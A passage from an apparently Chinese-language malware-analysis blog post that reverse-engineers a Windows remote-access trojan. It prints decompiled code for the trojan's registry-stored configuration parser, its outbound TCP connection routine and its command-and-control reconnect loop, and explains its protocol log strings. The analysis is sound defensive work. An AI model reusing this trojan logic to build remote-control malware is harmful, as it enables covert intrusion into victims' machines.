v79; ++v82 )</span><br><span class="line">          &#123;</span><br><span class="line">            if ( a0Db0Lk0Hs0Ld0L[v81 + i2] != aT1[i2] )// &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot;</span><br><span class="line">              break;</span><br><span class="line">            ++i2;</span><br><span class="line">          &#125;</span><br><span class="line">          if ( v82 == v79 )</span><br><span class="line">          &#123;</span><br><span class="line">            v81 += v79;</span><br><span class="line">            v80 += v79;</span><br><span class="line">            if ( v81 &lt; v78 )</span><br><span class="line">              break;</span><br><span class="line">          &#125;</span><br><span class="line">LABEL_156:</span><br><span class="line">          ++v81;</span><br><span class="line">          ++v80;</span><br><span class="line">          if ( v81 &gt;= v78 )</span><br><span class="line">            goto LABEL_157;</span><br><span class="line">        &#125;</span><br><span class="line">        // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot;</span><br><span class="line">        while ( a0Db0Lk0Hs0Ld0L[v81] != 124 )</span><br><span class="line">        &#123;</span><br><span class="line">          ++v81;</span><br><span class="line">          ++v80;</span><br><span class="line">          if ( v81 &gt;= v78 )</span><br><span class="line">            goto LABEL_156;</span><br><span class="line">        &#125;</span><br><span class="line">        v90 = dword_14005F6A8;</span><br><span class="line">        if ( a0Db0Lk0Hs0Ld0L[v80 - 1] == 49 )   // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot;</span><br><span class="line">          v90 = 1;</span><br><span class="line">        dword_14005F6A8 = v90;</span><br><span class="line">      &#125;</span><br><span class="line">LABEL_157:</span><br><span class="line">      sub_140008620(L&quot;p2:&quot;, &amp;Source_);</span><br><span class="line">      sub_140008620(L&quot;o2:&quot;, &amp;Source__0);</span><br><span class="line">      v84 = lstrlenW(a0Db0Lk0Hs0Ld0L);          // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot;</span><br><span class="line">      v85 = lstrlenW(L&quot;t2:&quot;);</span><br><span class="line">      v86 = 0;</span><br><span class="line">      v87 = 0;</span><br><span class="line">      if ( (int)v84 &gt; 0 )</span><br><span class="line">      &#123;</span><br><span class="line">        while ( 1 )</span><br><span class="line">        &#123;</span><br><span class="line">          v88 = 0;</span><br><span class="line">          for ( i3 = 0; i3 &lt; v85; ++v88 )</span><br><span class="line">          &#123;</span><br><span class="line">            if ( a0Db0Lk0Hs0Ld0L[v87 + i3] != aT2[i3] )// &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot;</span><br><span class="line">              break;</span><br><span class="line">            ++i3;</span><br><span class="line">          &#125;</span><br><span class="line">          if ( v88 == v85 )</span><br><span class="line">          &#123;</span><br><span class="line">            v87 += v85;</span><br><span class="line">            v86 += v85;</span><br><span class="line">            if ( v87 &lt; v84 )</span><br><span class="line">              break;</span><br><span class="line">          &#125;</span><br><span class="line">LABEL_165:</span><br><span class="line">          ++v87;</span><br><span class="line">          ++v86;</span><br><span class="line">          if ( v87 &gt;= v84 )</span><br><span class="line">            goto LABEL_173;</span><br><span class="line">        &#125;</span><br><span class="line">        // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot;</span><br><span class="line">        while ( a0Db0Lk0Hs0Ld0L[v87] != 124 )</span><br><span class="line">        &#123;</span><br><span class="line">          ++v87;</span><br><span class="line">          ++v86;</span><br><span class="line">          if ( v87 &gt;= v84 )</span><br><span class="line">            goto LABEL_165;</span><br><span class="line">        &#125;</span><br><span class="line">        v91 = dword_14005F8E8;</span><br><span class="line">        if ( a0Db0Lk0Hs0Ld0L[v86 - 1] == 49 )   // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot;</span><br><span class="line">          v91 = 1;</span><br><span class="line">        dword_14005F8E8 = v91;</span><br><span class="line">      &#125;</span><br><span class="line">LABEL_173:</span><br><span class="line">      sub_140008620(L&quot;p3:&quot;, &amp;Source__2);</span><br><span class="line">      sub_140008620(L&quot;o3:&quot;, &amp;Source__3);</span><br><span class="line">      v92 = lstrlenW(a0Db0Lk0Hs0Ld0L);          // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot;</span><br><span class="line">      LODWORD(v0) = lstrlenW(L&quot;t3:&quot;);</span><br><span class="line">      v93 = 0;</span><br><span class="line">      v94 = 0;</span><br><span class="line">      v95 = (int)v0;</span><br><span class="line">      if ( (int)v92 &gt; 0 )</span><br><span class="line">      &#123;</span><br><span class="line">        while ( 1 )</span><br><span class="line">        &#123;</span><br><span class="line">          v96 = 0;</span><br><span class="line">          v97 = 0;</span><br><span class="line">          if ( (int)v95 &gt; 0 )</span><br><span class="line">          &#123;</span><br><span class="line">            do</span><br><span class="line">            &#123;</span><br><span class="line">              LODWORD(v0) = aT3[v97];</span><br><span class="line">              if ( a0Db0Lk0Hs0Ld0L[v94 + v97] != (_WORD)v0 )// &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot;</span><br><span class="line">                break;</span><br><span class="line">              ++v97;</span><br><span class="line">              ++v96;</span><br><span class="line">            &#125;</span><br><span class="line">            while ( v97 &lt; v95 );</span><br><span class="line">          &#125;</span><br><span class="line">          if ( v96 == (_DWORD)v95 )</span><br><span class="line">          &#123;</span><br><span class="line">            v94 += v95;</span><br><span class="line">            v93 += v95;</span><br><span class="line">            if ( v94 &lt; v92 )</span><br><span class="line">              break;</span><br><span class="line">          &#125;</span><br><span class="line">LABEL_181:</span><br><span class="line">          ++v94;</span><br><span class="line">          ++v93;</span><br><span class="line">          if ( v94 &gt;= v92 )</span><br><span class="line">            return (int)v0;</span><br><span class="line">        &#125;</span><br><span class="line">        // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot;</span><br><span class="line">        while ( a0Db0Lk0Hs0Ld0L[v94] != 124 )</span><br><span class="line">        &#123;</span><br><span class="line">          ++v94;</span><br><span class="line">          ++v93;</span><br><span class="line">          if ( v94 &gt;= v92 )</span><br><span class="line">            goto LABEL_181;</span><br><span class="line">        &#125;</span><br><span class="line">        v98 = dword_14005FB28;</span><br><span class="line">        LODWORD(v0) = v93;</span><br><span class="line">        if ( a0Db0Lk0Hs0Ld0L[v93 - 1] == 49 )   // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot;</span><br><span class="line">          v98 = 1;</span><br><span class="line">        dword_14005FB28 = v98;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  return (int)v0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>1.打开注册表键 (Open Key)<br>这一行尝试打开 <code>HKEY_CURRENT_USER\Console</code> 键：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LODWORD(v0) = RegOpenKeyExW(HKEY_CURRENT_USER, L&quot;Console&quot;, 0, 0x20019u, &amp;hKey);</span><br></pre></td></tr></table></figure>

<p>2.第一次查询值 (Query Value - Get Size)<br>如果打开成功，这一行查询 <code>IpDate</code> 值的数据大小 (<code>cbData</code>)，但不读取数据：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if ( !(_DWORD)v0 )</span><br><span class="line">  LODWORD(v0) = RegQueryValueExW(hKey, L&quot;IpDate&quot;, 0, &amp;Type, 0, &amp;cbData);</span><br></pre></td></tr></table></figure>

<p>3.第二次查询值 (Query Value - Read Data)</p>
<p>如果第一次查询显示数据大小大于 <code>0xA</code>，则进入这段代码，<strong>这一行实际读取了</strong> <code>IpDate</code> <strong>的数据</strong> 到字符串 <code>a0Db0Lk0Hs0Ld0L</code> 中：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RegQueryValueExW(hKey, L&quot;IpDate&quot;, 0, &amp;Type, (LPBYTE)a0Db0Lk0Hs0Ld0L, &amp;cbData);// &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.nlark.com/yuque/0/2025/png/62156892/1765334902013-96e2d5c2-004f-42de-b323-232bd4699bd3.png" referrerpolicy="no-referrer" alt="null"></p>
<p>注册表确实有东西<br>但是我现在也不知道这个是干啥用的解码后就只有这个Ipdatetime<br>(9-27-1-25-18)</p>
<p>这个函数 <code>sub_140008750</code> 是 <strong>木马的配置解析初始化函数</strong>，核心作用是：从「内置硬编码字符串」或「Windows 注册表」中读取配置信息，解析后设置一系列功能开关（全局变量），仅在程序启动时执行一次（通过标志位控制）<br>黑客植入的恶意程序中「读取控制配置」的模块，解析是否启用远控、数据上传、端口转发等功能的开关</p>
<p><img src="https://cdn.nlark.com/yuque/0/2025/jpg/62156892/1765334902135-aed8d6b2-db84-4dd2-8761-2c9bc88b802f.jpg" referrerpolicy="no-referrer" alt="null"><br>上面图片”|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|”<br>这里可以得到5202是混淆后的时间就是2025年11月9日</p>
<p>查看sub_140003390函数的反编译结果</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line">char __fastcall cyber(char *ArgList, LPCWCH lpWideCharStr, u_short hostshort)</span><br><span class="line">&#123;</span><br><span class="line">  // ArgList: 指向一个结构体的指针，用于存储连接状态和句柄。</span><br><span class="line">  // lpWideCharStr: 指向宽字符字符串 (Unicode)，包含目标 HOSTNAME（主机名）。</span><br><span class="line">  // hostshort: 目标 PORT（端口号），为主机字节序。</span><br><span class="line">  SOCKET v6; // 用于存储新的套接字句柄</span><br><span class="line">  // ... 其他局部变量</span><br><span class="line"></span><br><span class="line">  // --- 状态初始化和重置 ---</span><br><span class="line">  ResetEvent(*((HANDLE *)ArgList + 1)); // 重置 ArgList 结构体中的一个同步事件句柄</span><br><span class="line">  _InterlockedExchange((volatile __int32 *)ArgList + 8, 0); // 原子地设置 ArgList 中偏移量 +8 处的标志为 0 (例如：连接状态为“正在连接”)</span><br><span class="line">  *((_DWORD *)ArgList + 7) = timeGetTime(); // 记录当前时间 (偏移量 +7)</span><br><span class="line">  // ... ArgList 结构体的其他初始化和设置</span><br><span class="line"></span><br><span class="line">  // --- 1. 创建套接字 (Socket) ---</span><br><span class="line">  v6 = socket(2, 1, 6); // 创建新的套接字：AF_INET (2, IPv4), SOCK_STREAM (1, TCP流), IPPROTO_TCP (6) -&gt; TCP/IPv4</span><br><span class="line">  *((_QWORD *)ArgList + 22) = v6; // 将新的套接字句柄存储在 ArgList 结构体的偏移量 +22 处</span><br><span class="line">  if ( v6 == -1 ) // 检查套接字创建是否失败</span><br><span class="line">    return 0;</span><br><span class="line"></span><br><span class="line">  // --- 2. 转换主机名 (宽字符到多字节) ---</span><br><span class="line">  cchWideChar = lstrlenW(lpWideCharStr); // 获取宽字符主机名字符串的长度</span><br><span class="line">  // 确定多字节字符串所需的缓冲区大小</span><br><span class="line">  cbMultiByte_1 = WideCharToMultiByte(0, 0, lpWideCharStr, cchWideChar, 0, 0, 0, 0); </span><br><span class="line">  cbMultiByte = cbMultiByte_1;</span><br><span class="line">  lpMultiByteStr = (CHAR *)operator new(cbMultiByte_1 + 1); // 分配内存用于多字节字符串 (+1 用于空终止符)</span><br><span class="line">  cchWideChar_1 = lstrlenW(lpWideCharStr);</span><br><span class="line">  // 执行实际的转换：从宽字符到多字节</span><br><span class="line">  WideCharToMultiByte(0, 0, lpWideCharStr, cchWideChar_1, lpMultiByteStr, cbMultiByte, 0, 0); </span><br><span class="line">  lpMultiByteStr[cbMultiByte] = 0; // 空终止多字节字符串</span><br><span class="line"></span><br><span class="line">  // --- 3. 解析主机名到 IP 地址 (DNS Lookup) ---</span><br><span class="line">  hostbyname = gethostbyname(lpMultiByteStr); // 执行 DNS 查询，将主机名解析为 IP 地址</span><br><span class="line">  j_free(lpMultiByteStr); // 释放分配的多字节字符串缓冲区</span><br><span class="line">  if ( !hostbyname ) // 检查 DNS 解析是否失败</span><br><span class="line">    return 0;</span><br><span class="line"></span><br><span class="line">  // --- 4. 准备目标地址结构体 (sockaddr_in) ---</span><br><span class="line">  name.sa_family = 2; // 设置地址族为 AF_INET (IPv4)</span><br><span class="line">  // 设置端口号：将 hostshort (主机字节序) 转换为网络字节序</span><br><span class="line">  *(_WORD *)name.sa_data = htons(hostshort); </span><br><span class="line">  s = *((_QWORD *)ArgList + 22); // 获取套接字句柄</span><br><span class="line">  // 设置 IP 地址：获取 h_addr_list 指针数组中的第一个地址</span><br><span class="line">  *(_DWORD *)&amp;name.sa_data[2] = **(_DWORD **)hostbyname-&gt;h_addr_list; </span><br><span class="line"></span><br><span class="line">  // --- 5. 建立连接 (TCP Handshake) ---</span><br><span class="line">  if ( connect(s, &amp;name, 16) == -1 ) // 尝试建立 TCP 连接</span><br><span class="line">    return 0;</span><br><span class="line"></span><br><span class="line">  // --- 6. 配置套接字选项 (setsockopt) ---</span><br><span class="line">  // 设置 SO_RCVBUF (接收缓冲区大小, 4097) 为 0x40000 (256 KB)</span><br><span class="line">  s_1 = *((_QWORD *)ArgList + 22);</span><br><span class="line">  *(_DWORD *)optval = 0x40000;</span><br><span class="line">  setsockopt(s_1, 0xFFFF, 4097, optval, 4); // 0xFFFF 是 SOL_SOCKET (套接字级别)</span><br><span class="line"></span><br><span class="line">  // 设置 SO_SNDBUF (发送缓冲区大小, 4098) 为 0x40000 (256 KB)</span><br><span class="line">  s_2 = *((_QWORD *)ArgList + 22);</span><br><span class="line">  *(_DWORD *)optval = 0x40000;</span><br><span class="line">  setsockopt(s_2, 0xFFFF, 4098, optval, 4);</span><br><span class="line"></span><br><span class="line">  // 设置 SO_SNDTIMEO (发送超时, 4102) 为 30000 毫秒 (30 秒)</span><br><span class="line">  s_3 = *((_QWORD *)ArgList + 22);</span><br><span class="line">  *(_DWORD *)optval_ = 30000;</span><br><span class="line">  setsockopt(s_3, 0xFFFF, 4102, optval_, 4);</span><br><span class="line"></span><br><span class="line">  // 设置 SO_KEEPALIVE (启用保持活动机制, 8) 为 1</span><br><span class="line">  s_5 = *((_QWORD *)ArgList + 22);</span><br><span class="line">  *(_DWORD *)optval__1 = 1;</span><br><span class="line">  if ( !setsockopt(s_5, 0xFFFF, 8, optval__1, 4) )</span><br><span class="line">  &#123;</span><br><span class="line">    // 如果 SO_KEEPALIVE 设置成功，则配置 Keep-Alive 定时参数</span><br><span class="line">    s_4 = *((_QWORD *)ArgList + 22);</span><br><span class="line">    vInBuffer[0] = 1;       // 开关 (1: 启用)</span><br><span class="line">    vInBuffer[1] = 180000;  // 保持活动时间 (180 秒 或 3 分钟)</span><br><span class="line">    vInBuffer[2] = 5000;    // 保持活动间隔 (5 秒)</span><br><span class="line">    // 使用 WSAIoctl 和 SIO_KEEPALIVE_VALS (0x98000004) 设置自定义 Keep-Alive 参数</span><br><span class="line">    WSAIoctl(s_4, 0x98000004, vInBuffer, 0xCu, 0, 0, &amp;cbBytesReturned, 0, 0); </span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // --- 7. 更新状态并创建工作线程 ---</span><br><span class="line">  _InterlockedExchange((volatile __int32 *)ArgList + 8, 1); // 原子地设置连接状态标志为 1 (例如：已连接)</span><br><span class="line">  ThrdAddr = 0;</span><br><span class="line">  // 创建一个线程 (例如：接收/读取线程)</span><br><span class="line">  *((_QWORD *)ArgList + 20) = beginthreadex(0, 0, sub_140003690, ArgList, 0, &amp;ThrdAddr); </span><br><span class="line">  ThrdAddr_ = 0;</span><br><span class="line">  // 创建第二个线程 (例如：发送/写入线程或心跳线程)</span><br><span class="line">  *((_QWORD *)ArgList + 21) = beginthreadex(0, 0, sub_1400037E0, ArgList, 0, &amp;ThrdAddr_); </span><br><span class="line">  return 1; // 成功</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<p><code>sub_140003390</code>函数是 Windows 环境中建立<strong>出站 TCP 网络连接</strong>的常见模式</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">通过 *(_WORD *)name.sa_data = htons(hostshort); 将其转换为网络字节序并设置为socket连接端口</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line">name.sa_family = 2; // AF_INET</span><br><span class="line">*(_WORD *)name.sa_data = htons(hostshort); // 端口号 (网络字节序)</span><br><span class="line">*(_DWORD *)&amp;name.sa_data[2] = **(_DWORD **)hostbyname-&gt;h_addr_list; // IP地址</span><br><span class="line">// Hidden C++ exception states: #wind=2</span><br><span class="line">void __fastcall __noreturn sub_7FF6175EA440(LPVOID lpThreadParameter)</span><br><span class="line">&#123;</span><br><span class="line">  int v1; // eax</span><br><span class="line">  __int64 v2; // rdi</span><br><span class="line">  void *v3; // rax</span><br><span class="line">  __int64 v4; // rbp</span><br><span class="line">  void *v5; // rax</span><br><span class="line">  __int64 v6; // rsi</span><br><span class="line">  int v7; // r11d</span><br><span class="line">  int v8; // eax</span><br><span class="line">  void (__fastcall **v9)(_QWORD); // rbx</span><br><span class="line">  unsigned int v10; // eax</span><br><span class="line">  int v11; // ebx</span><br><span class="line">  _QWORD v12[2]; // [rsp+38h] [rbp-60h] BYREF</span><br><span class="line">  int v13; // [rsp+48h] [rbp-50h]</span><br><span class="line">  HANDLE hObject; // [rsp+50h] [rbp-48h]</span><br><span class="line">  int v15; // [rsp+60h] [rbp-38h]</span><br><span class="line">  HANDLE hHandle; // [rsp+68h] [rbp-30h]</span><br><span class="line">  void *v17; // [rsp+A8h] [rbp+10h] BYREF</span><br><span class="line"></span><br><span class="line">  CreateThread(0, 0, StartAddress, 0, 0, 0);</span><br><span class="line">  CreateThread(0, 0, sub_7FF6175EA3E0, 0, 0, 0);</span><br><span class="line">  v1 = sub_7FF6175EC5F8(&amp;unk_7FF61763FB2C);</span><br><span class="line">  Sleep(1000 * v1);</span><br><span class="line">  v2 = 0;</span><br><span class="line">  v3 = operator new(0xB8u);</span><br><span class="line">  if ( v3 )</span><br><span class="line">    v4 = sub_7FF6175E3230(v3);</span><br><span class="line">  else</span><br><span class="line">    v4 = 0;</span><br><span class="line">  v5 = operator new(0x368u);</span><br><span class="line">  v17 = v5;</span><br><span class="line">  if ( v5 )</span><br><span class="line">    v6 = sub_7FF6175E7690(v5);</span><br><span class="line">  else</span><br><span class="line">    v6 = 0;</span><br><span class="line">  while ( 1 )</span><br><span class="line">  &#123;</span><br><span class="line">    sub_7FF6175E3210();</span><br><span class="line">    if ( byte_7FF61763E99E )</span><br><span class="line">    &#123;</span><br><span class="line">      wcscpy_s(a127001, 0xFFu, L&quot;127.0.0.1&quot;);   // &quot;127.0.0.1&quot;</span><br><span class="line">      wcscpy_s(a6666, 0x1Eu, L&quot;8888&quot;);          // &quot;6666&quot;</span><br><span class="line">      v7 = dword_7FF61763F8E8;</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">      wcscpy_s(a127001, 0xFFu, L&quot;127.0.0.1&quot;);   // &quot;127.0.0.1&quot;</span><br><span class="line">      wcscpy_s(a6666, 0x1Eu, L&quot;6666&quot;);          // &quot;6666&quot;</span><br><span class="line">      v7 = dword_7FF61763F6A8;</span><br><span class="line">    &#125;</span><br><span class="line">    byte_7FF61763E99E = byte_7FF61763E99E == 0;</span><br><span class="line">    dword_7FF61763E550 = v7;</span><br><span class="line">    if ( ++dword_7FF61763F3F4 == 200 )</span><br><span class="line">    &#123;</span><br><span class="line">      sub_7FF6175E3210();</span><br><span class="line">      wcscpy_s(a127001, 0xFFu, L&quot;127.0.0.1&quot;);   // &quot;127.0.0.1&quot;</span><br><span class="line">      wcscpy_s(a6666, 0x1Eu, L&quot;80&quot;);            // &quot;6666&quot;</span><br><span class="line">      v7 = dword_7FF61763FB28;</span><br><span class="line">      dword_7FF61763E550 = dword_7FF61763FB28;</span><br><span class="line">      dword_7FF61763F3F4 = 0;</span><br><span class="line">    &#125;</span><br><span class="line">    if ( v2 )</span><br><span class="line">    &#123;</span><br><span class="line">      (**(void (__fastcall ***)(__int64))v2)(v2);</span><br><span class="line">      v7 = dword_7FF61763E550;</span><br><span class="line">    &#125;</span><br><span class="line">    v2 = v6;</span><br><span class="line">    if ( v7 == 1 )</span><br><span class="line">      v2 = v4;</span><br><span class="line">    v8 = sub_7FF6175EC5F8(&amp;unk_7FF61763FB68);</span><br><span class="line">    Sleep(1000 * v8);</span><br><span class="line">    v9 = *(void (__fastcall ***)(_QWORD))v2;</span><br><span class="line">    v10 = sub_7FF6175EC5F8(a6666);              // &quot;6666&quot;</span><br><span class="line">    if ( ((unsigned __int8 (__fastcall *)(__int64, wchar_t *, _QWORD))v9[4])(v2, a127001, v10) )// &quot;127.0.0.1&quot;</span><br><span class="line">    &#123;</span><br><span class="line">      v11 = dword_7FF61763FCE8;</span><br><span class="line">      v12[0] = &amp;CManager::`vftable&#x27;;</span><br><span class="line">      v12[1] = v2;</span><br><span class="line">      (*(void (__fastcall **)(__int64, _QWORD *))(*(_QWORD *)v2 + 24LL))(v2, v12);</span><br><span class="line">      hObject = CreateEventA(0, 1, 0, 0);</span><br><span class="line">      v13 = 0;</span><br><span class="line">      v12[0] = &amp;CKernelManager::`vftable&#x27;;</span><br><span class="line">      hHandle = 0;</span><br><span class="line">      v15 = v11;</span><br><span class="line">      LOWORD(v17) = 260;</span><br><span class="line">      (*(void (__fastcall **)(__int64, void **, __int64))(*(_QWORD *)v2 + 16LL))(v2, &amp;v17, 2);</span><br><span class="line">      (*(void (__fastcall **)(__int64))(*(_QWORD *)v2 + 40LL))(v2);</span><br><span class="line">      WaitForSingleObject(hHandle, 0xFFFFFFFF);</span><br><span class="line">      v12[0] = &amp;CKernelManager::`vftable&#x27;;</span><br><span class="line">      CloseHandle(hHandle);</span><br><span class="line">      v12[0] = &amp;CManager::`vftable&#x27;;</span><br><span class="line">      CloseHandle(hObject);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">这是一个无限循环的线程函数 sub_7FF6175EA440 ，负责建立与C&amp;C服务器的连接并执行后续操作。函数使用 __noreturn 声明，表示它永远不会返回</span><br></pre></td></tr></table></figure>



<p><img src="https://cdn.nlark.com/yuque/0/2025/jpg/62156892/1765334902222-6d58ab53-2bcf-4935-bcd1-aaa9d2440f14.jpg" referrerpolicy="no-referrer" alt="null"></p>
<p>这里发现了一些信息<br>我们copy下来看一下</p>
<p>这些全是<strong>TCP 协议底层日志</strong>，说明程序不是简单调用系统 TCP 接口，而是实现了自定义的 TCP 通信（常见于木马 &#x2F; 远控程序，用于稳定和控制端交互）</p>
<table>
<thead>
<tr>
<th>字符串</th>
<th>含义（通俗解释）</th>
<th>排查价值</th>
</tr>
</thead>
<tbody><tr>
<td><code>recv sn=%lu</code></td>
<td>接收 TCP 数据包，记录「序列号（sn）」</td>
<td>证明程序在和外部（如黑客服务器）进行 TCP 数据交互，sn 是数据包有序传输的标识</td>
</tr>
<tr>
<td><code>input ack: sn=%lu rtt=%ld rto=%ld</code></td>
<td>收到 TCP 确认包（ACK），记录序列号、往返时间（rtt）、重传超时（rto）</td>
<td>木马为了保证 C2 连接稳定，会动态调整 rto（避免连接断开），是主动通信的铁证</td>
</tr>
<tr>
<td><code>input psh: sn=%lu ts=%lu</code></td>
<td>收到 TCP 推送包（PSH），记录序列号和时间戳（ts）</td>
<td>PSH 包用于「强制立即传输数据」，常见于黑客发送控制指令、接收窃取数据时</td>
</tr>
<tr>
<td><code>input probe</code></td>
<td>收到 TCP 探测包</td>
<td>黑客可能在通过探测包检测你的主机是否在线、连接是否存活</td>
</tr>
<tr>
<td><code>input wins: %lu</code></td>
<td>记录 TCP 窗口大小（wins）</td>
<td>优化数据传输效率，进一步证明是「持续双向通信」（而非单次请求）</td>
</tr>
</tbody></table>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span 